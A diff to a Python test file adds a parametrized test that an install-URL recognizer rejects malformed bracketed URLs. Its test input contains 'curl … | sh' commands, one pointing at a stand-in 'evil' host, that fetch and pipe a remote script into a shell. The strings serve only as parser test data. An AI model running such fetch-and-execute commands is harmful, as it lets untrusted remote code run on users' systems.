@@ -69,3 +69,12 @@ def test_a_segment_is_a_sha_by_shape() -> None:
     assert [
         InstallUrlRecognizer.is_sha_segment(s) for s in ("abc1234", "v1.2.3", "main")
     ] == [True, False, False]
+
+
+@pytest.mark.parametrize(
+    "token", ["https://[", "https://[evil/proj/abc1234/install.sh"]
+)
+def test_an_unbalanced_bracket_url_is_not_an_install_url(token: str) -> None:
+    refs = _RECOGNIZER.scan(f"curl {token} | sh; curl {_HOST}/abc1234/install.sh | sh")
+
+    assert [ref.segment for ref in refs] == ["abc1234"]
